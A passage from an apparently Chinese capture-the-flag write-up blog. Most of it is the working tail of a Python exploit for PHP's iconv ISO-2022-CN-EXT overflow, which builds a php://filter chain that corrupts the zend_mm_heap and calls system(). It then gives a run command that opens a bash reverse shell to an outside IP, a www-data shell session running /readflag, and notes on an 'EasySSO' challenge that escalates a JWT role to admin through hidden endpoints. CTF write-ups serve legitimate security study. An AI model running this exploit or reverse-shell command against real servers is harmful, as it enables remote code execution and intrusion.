class="string"></span></span><br><span class="line"><span class="string">        Keep in mind that we know the address of the main heap, and the libraries.</span></span><br><span class="line"><span class="string">        ASLR/PIE do not matter here.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point</span></span><br><span class="line"><span class="string">        lower. For instance, we have the following free list:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        By triggering the bug from chunk ..900, we get:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        That&#x27;s step 3.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Now, in order to control the free list, and make it point whereever we want,</span></span><br><span class="line"><span class="string">        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,</span></span><br><span class="line"><span class="string">        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.</span></span><br><span class="line"><span class="string">        That&#x27;s step 2.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have</span></span><br><span class="line"><span class="string">        a problem: after step2 has been processed, the free list goes bottom-up, like:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates</span></span><br><span class="line"><span class="string">        chunks. When they get freed, they reverse the free list. Now step2 allocates in</span></span><br><span class="line"><span class="string">        reverse order, and therefore after step2, chunks are in the correct order.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Another problem comes up.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.</span></span><br><span class="line"><span class="string">        Since step2 creates chunks that contain pointers and pointers are generally not</span></span><br><span class="line"><span class="string">        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.</span></span><br><span class="line"><span class="string">        To avoid this, we put the chunks in step2 at the very end of the chain, and</span></span><br><span class="line"><span class="string">        prefix them with `0\n`. When dechunked (right before the iconv), they will</span></span><br><span class="line"><span class="string">        &quot;disappear&quot; from the chain, preserving them from the character set conversion</span></span><br><span class="line"><span class="string">        and saving us from an unwanted processing error that would stop the processing</span></span><br><span class="line"><span class="string">        chain.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We</span></span><br><span class="line"><span class="string">        don&#x27;t know the precise layout of the heap, but we know that at the top of the</span></span><br><span class="line"><span class="string">        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.</span></span><br><span class="line"><span class="string">        Its free_slot[] array contains a pointer to each free list. By overwriting it,</span></span><br><span class="line"><span class="string">        we can make PHP allocate chunks whereever we want. In addition, its custom_heap</span></span><br><span class="line"><span class="string">        field contains pointers to hook functions for emalloc, efree, and erealloc</span></span><br><span class="line"><span class="string">        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and</span></span><br><span class="line"><span class="string">        then overwrite the use_custom_heap flag to make PHP use these function pointers</span></span><br><span class="line"><span class="string">        instead. We can now do our favorite CTF technique and get a call to</span></span><br><span class="line"><span class="string">        system(&lt;chunk&gt;).</span></span><br><span class="line"><span class="string">        We make sure that the &quot;system&quot; command kills the current process to avoid other</span></span><br><span class="line"><span class="string">        system() calls with random chunk data, leading to undefined behaviour.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the</span></span><br><span class="line"><span class="string">        process is in a random state, we still get contiguous, in order chunks for our</span></span><br><span class="line"><span class="string">        exploit.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Therefore, the whole process described here CANNOT crash. Everything falls</span></span><br><span class="line"><span class="string">        perfectly in place, and nothing can get in the middle of our allocations.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        LIBC = <span class="variable language_">self</span>.info[<span class="string">&quot;libc&quot;</span>]</span><br><span class="line">        ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]</span><br><span class="line">        ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]</span><br><span class="line">        ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">        ADDR_HEAP = <span class="variable language_">self</span>.info[<span class="string">&quot;heap&quot;</span>]</span><br><span class="line">        ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span></span><br><span class="line">        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span></span><br><span class="line"></span><br><span class="line">        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">        CS = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Pad needs to stay at size 0x100 at every step</span></span><br><span class="line">        pad_size = CS - <span class="number">0x18</span></span><br><span class="line">        pad = <span class="string">b&quot;\x00&quot;</span> * pad_size</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)</span><br><span class="line">        pad = compressed_bucket(pad)</span><br><span class="line"></span><br><span class="line">        step1_size = <span class="number">1</span></span><br><span class="line">        step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size</span><br><span class="line">        step1 = chunked_chunk(step1)</span><br><span class="line">        step1 = chunked_chunk(step1)</span><br><span class="line">        step1 = chunked_chunk(step1, CS)</span><br><span class="line">        step1 = compressed_bucket(step1)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to</span></span><br><span class="line">        <span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;</span></span><br><span class="line"></span><br><span class="line">        step2_size = <span class="number">0x48</span></span><br><span class="line">        step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)</span><br><span class="line">        step2 = chunked_chunk(step2, CS)</span><br><span class="line">        step2 = chunked_chunk(step2)</span><br><span class="line">        step2 = compressed_bucket(step2)</span><br><span class="line"></span><br><span class="line">        step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)</span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)</span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr)</span><br><span class="line">        step2_write_ptr = compressed_bucket(step2_write_ptr)</span><br><span class="line"></span><br><span class="line">        step3_size = CS</span><br><span class="line"></span><br><span class="line">        step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = chunked_chunk(step3)</span><br><span class="line">        step3 = compressed_bucket(step3)</span><br><span class="line"></span><br><span class="line">        step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)</span><br><span class="line">        step3_overflow = compressed_bucket(step3_overflow)</span><br><span class="line"></span><br><span class="line">        step4_size = CS</span><br><span class="line">        step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = chunked_chunk(step4)</span><br><span class="line">        step4 = compressed_bucket(step4)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot</span></span><br><span class="line">        <span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values</span></span><br><span class="line">        step4_pwn = ptr_bucket(</span><br><span class="line">            <span class="number">0x200000</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="comment"># free_slot</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            ADDR_HEAP,  <span class="comment"># 0x140</span></span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            size=CS,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        step4_custom_heap = ptr_bucket(</span><br><span class="line">            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        step4_use_custom_heap_size = <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">        COMMAND = <span class="variable language_">self</span>.command</span><br><span class="line">        COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.sleep:</span><br><span class="line">            COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;self.sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span></span><br><span class="line">        COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> (</span><br><span class="line">            <span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size</span><br><span class="line">        ), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span></span><br><span class="line">        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">        step4_use_custom_heap = COMMAND</span><br><span class="line">        step4_use_custom_heap = qpe(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)</span><br><span class="line">        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)</span><br><span class="line"></span><br><span class="line">        pages = (</span><br><span class="line">            step4 * <span class="number">3</span></span><br><span class="line">            + step4_pwn</span><br><span class="line">            + step4_custom_heap</span><br><span class="line">            + step4_use_custom_heap</span><br><span class="line">            + step3_overflow</span><br><span class="line">            + pad * <span class="variable language_">self</span>.pad</span><br><span class="line">            + step1 * <span class="number">3</span></span><br><span class="line">            + step2_write_ptr</span><br><span class="line">            + step2 * <span class="number">2</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        resource = compress(compress(pages))</span><br><span class="line">        resource = b64(resource)</span><br><span class="line">        resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        filters = [</span><br><span class="line">            <span class="comment"># Create buckets</span></span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Step 0: Setup heap</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Step 1: Reverse FL order</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Step 2: Put fake pointer and make FL order back to normal</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Step 3: Trigger overflow</span></span><br><span class="line">            <span class="string">&quot;dechunk&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.UTF-8.ISO-2022-CN-EXT&quot;</span>,</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Step 4: Allocate at arbitrary address and change zend_mm_heap</span></span><br><span class="line">            <span class="string">&quot;convert.quoted-printable-decode&quot;</span>,</span><br><span class="line">            <span class="string">&quot;convert.iconv.L1.L1&quot;</span>,</span><br><span class="line">        ]</span><br><span class="line">        filters = <span class="string">&quot;|&quot;</span>.join(filters)</span><br><span class="line">        path = <span class="string">f&quot;php://filter/read=<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;resource&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"><span class="meta">    @inform(<span class="params"><span class="string">&quot;Triggering...&quot;</span></span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        path = <span class="variable language_">self</span>.build_exploit_path()</span><br><span class="line">        start = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.remote.send(path)</span><br><span class="line">        <span class="keyword">except</span> (ConnectionError, ChunkedEncodingError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        msg_print()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.sleep:</span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/] [i](probably)[/]&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> start + <span class="variable language_">self</span>.sleep &lt;= time.time():</span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on green] SUCCESS [/]&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Wrong heap, maybe? If the exploited suggested others, use them!</span></span><br><span class="line">            msg_print(<span class="string">&quot;    [b white on black] EXPLOIT [/][b white on red] FAILURE [/]&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        msg_print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">data</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns data suitable for `zlib.inflate`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># Remove 2-byte header and 4-byte checksum</span></span><br><span class="line">    <span class="keyword">return</span> zlib.compress(data, <span class="number">9</span>)[<span class="number">2</span>:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64</span>(<span class="params">data: <span class="built_in">bytes</span>, misalign=<span class="literal">True</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    payload = base64.encode(data)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> misalign <span class="keyword">and</span> payload.endswith(<span class="string">&quot;=&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Misaligned: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload.encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compressed_bucket</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> chunked_chunk(data, <span class="number">0x8000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qpe</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Emulates quoted-printable-encode.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">f&quot;=<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> data).upper().encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ptr_bucket</span>(<span class="params">*ptrs, size=<span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(ptrs) * <span class="number">8</span> == size</span><br><span class="line">    bucket = <span class="string">b&quot;&quot;</span>.join(<span class="built_in">map</span>(p64, ptrs))</span><br><span class="line">    bucket = qpe(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = chunked_chunk(bucket)</span><br><span class="line">    bucket = compressed_bucket(bucket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bucket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chunked_chunk</span>(<span class="params">data: <span class="built_in">bytes</span>, size: <span class="built_in">int</span> = <span class="literal">None</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Constructs a chunked representation of the given chunk. If size is given, the</span></span><br><span class="line"><span class="string">    chunked representation has size `size`.</span></span><br><span class="line"><span class="string">    For instance, `ABCD` with size 10 becomes: `0004\nABCD\n`.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># The caller does not care about the size: let&#x27;s just add 8, which is more than</span></span><br><span class="line">    <span class="comment"># enough</span></span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        size = <span class="built_in">len</span>(data) + <span class="number">8</span></span><br><span class="line">    keep = <span class="built_in">len</span>(data) + <span class="built_in">len</span>(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">    size = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">len</span>(data):x&#125;</span>&quot;</span>.rjust(size - keep, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> size.encode() + <span class="string">b&quot;\n&quot;</span> + data + <span class="string">b&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Region</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A memory region.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    start: <span class="built_in">int</span></span><br><span class="line">    stop: <span class="built_in">int</span></span><br><span class="line">    permissions: <span class="built_in">str</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">size</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.stop - <span class="variable language_">self</span>.start</span><br><span class="line"></span><br><span class="line">Exploit()</span><br><span class="line">python exp.py ``http://<span class="number">60.205</span><span class="number">.163</span><span class="number">.215</span>:<span class="number">36064</span>/upload.php`` <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/162.210.192.205/51587 0&gt;&amp;1&quot;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>哈哈 flag 是空的，这我写个什么劲</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">www-data@t10001-comp-gavatar-970624789695954869<span class="attr">ltbg</span>:<span class="regexp">/var/</span>www/html$ ls -al /</span><br><span class="line">total <span class="number">1368</span></span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root    <span class="number">4096</span> <span class="title class_">Oct</span> <span class="number">11</span> <span class="number">14</span>:<span class="number">29</span> .</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root    <span class="number">4096</span> <span class="title class_">Oct</span> <span class="number">11</span> <span class="number">14</span>:<span class="number">29</span> ..</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root       <span class="number">7</span> <span class="title class_">Apr</span>  <span class="number">8</span>  <span class="number">2024</span> bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root    <span class="number">4096</span> <span class="title class_">Jan</span> <span class="number">28</span>  <span class="number">2024</span> boot</span><br><span class="line">drwxr-xr-x    <span class="number">5</span> root root     <span class="number">360</span> <span class="title class_">Oct</span> <span class="number">11</span> <span class="number">14</span>:<span class="number">29</span> dev</span><br><span class="line">-rwxr-xr-x    <span class="number">1</span> root root     <span class="number">100</span> <span class="title class_">Jan</span> <span class="number">30</span>  <span class="number">2025</span> docker-entrypoint.<span class="property">sh</span></span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root    <span class="number">4096</span> <span class="title class_">Oct</span> <span class="number">11</span> <span class="number">14</span>:<span class="number">29</span> etc</span><br><span class="line">-r--------    <span class="number">1</span> root root      <span class="number">43</span> <span class="title class_">Oct</span> <span class="number">11</span> <span class="number">14</span>:<span class="number">29</span> flag</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root    <span class="number">4096</span> <span class="title class_">Jan</span> <span class="number">28</span>  <span class="number">2024</span> home</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root       <span class="number">7</span> <span class="title class_">Apr</span>  <span class="number">8</span>  <span class="number">2024</span> lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root       <span class="number">9</span> <span class="title class_">Apr</span>  <span class="number">8</span>  <span class="number">2024</span> lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root    <span class="number">4096</span> <span class="title class_">Apr</span>  <span class="number">8</span>  <span class="number">2024</span> media</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root    <span class="number">4096</span> <span class="title class_">Apr</span>  <span class="number">8</span>  <span class="number">2024</span> mnt</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root    <span class="number">4096</span> <span class="title class_">Apr</span>  <span class="number">8</span>  <span class="number">2024</span> opt</span><br><span class="line">dr-xr-xr-x <span class="number">1297</span> root root       <span class="number">0</span> <span class="title class_">Oct</span> <span class="number">11</span> <span class="number">14</span>:<span class="number">29</span> proc</span><br><span class="line">-rwsr-xr-x    <span class="number">1</span> root root <span class="number">1323160</span> <span class="title class_">Jan</span> <span class="number">30</span>  <span class="number">2025</span> readflag</span><br><span class="line">drwx------    <span class="number">1</span> root root    <span class="number">4096</span> <span class="title class_">Apr</span> <span class="number">10</span>  <span class="number">2024</span> root</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root    <span class="number">4096</span> <span class="title class_">Apr</span> <span class="number">10</span>  <span class="number">2024</span> run</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root       <span class="number">8</span> <span class="title class_">Apr</span>  <span class="number">8</span>  <span class="number">2024</span> sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root    <span class="number">4096</span> <span class="title class_">Apr</span>  <span class="number">8</span>  <span class="number">2024</span> srv</span><br><span class="line">dr-xr-xr-x   <span class="number">13</span> root root       <span class="number">0</span> <span class="title class_">Sep</span> <span class="number">13</span> <span class="number">07</span>:<span class="number">37</span> sys</span><br><span class="line">drwxrwxrwt    <span class="number">1</span> root root    <span class="number">4096</span> <span class="title class_">Oct</span> <span class="number">11</span> <span class="number">14</span>:<span class="number">30</span> tmp</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root    <span class="number">4096</span> <span class="title class_">Apr</span>  <span class="number">8</span>  <span class="number">2024</span> usr</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root    <span class="number">4096</span> <span class="title class_">Jan</span> <span class="number">30</span>  <span class="number">2025</span> <span class="keyword">var</span></span><br><span class="line"></span><br><span class="line">www-data@t10001-comp-gavatar-97059856455853662<span class="attr">xwxvl</span>:<span class="regexp">/$ /</span>readflag</span><br><span class="line">www-data@t10001-comp-gavatar-97059856455853662<span class="attr">xwxvl</span>:/$ </span><br></pre></td></tr></table></figure>

<h3 id="EasySSO"><a href="#EasySSO" class="headerlink" title="EasySSO"></a>EasySSO</h3><p>目录扫描发现 regesiter接口可以注册用户，但jwt key 爆破篡改不成功</p>
<p>登陆后dashboard处注释有隐藏的jwt token 以及 &#x2F;getNewToken接口</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> token=eyJhbGciOiJIUzI1NiJ9.<span class="property">eyJzdWIiOiJ3YW5nbGFvbGl1NjYiLCJyb2xlIjoiZWUiLCJpYXQiOjE3NTAzOTQyMTksImV4cCI6MTc1MDQ4MDYxOX0</span>.<span class="property">jIKp9BsKiN5SmbKlzhLaFhlmHJfrIRSJb9LuGu</span>-zWf8;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;wanglaoliu66&quot;</span>,</span><br><span class="line">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;ee&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1760368150</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1760454550</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注册用户role 为cc，此处role 为ee 想来是管理员了，日期过期得想办法重新获取token，但是得知管理员用户名为 wanglaoliu66</span><br></pre></td></tr></table></figure>

<p>在 &#x2F;login 页面 也能发现一个 &#x2F;getInnerLoginInfo 接口和 post 参数 type（默认值为1）</p>
<p>注册点注册一个wanglaoliu66的账号发现成功，说明不是以用户名鉴权，那别的post只有一个type有用，改改type做login（经尝试2有用）</p>
<p>先试试 &#x2F;getNewToken ，发现返回的还是cc 权限，但是有个ftoken 先加在cookie里</p>
<p>在 &#x2F;getInnerLoginInfo 里带 ftoken 就可以正常回显内容了，注意前面登陆用的type 2 此处也是type 2，发现返回的role 已经是ee管理员。新增一个ttoken</p>
